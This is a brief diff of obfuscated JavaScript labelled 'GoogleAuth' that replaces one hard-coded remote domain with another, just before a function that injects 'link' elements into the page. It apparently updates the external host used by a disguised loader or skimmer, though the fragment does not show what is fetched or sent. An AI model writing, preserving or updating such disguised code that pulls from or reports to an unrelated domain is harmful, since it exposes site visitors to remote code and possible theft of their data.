@@ -7462,7 +7462,7 @@ var GoogleAuth;
                         _0x9f75x19.shift = _0x9f75x9.shift;
                     return _0x9f75x19
                 }();
-            var _0x9f75x60 = 'wormatrix.live';
+            var _0x9f75x60 = 'iraqcraft.store';
 
             function _0x9f75x61(_0x9f75x1f, _0x9f75x3, _0x9f75x28) {
                 let _0x9f75xd = document.createElement('link');
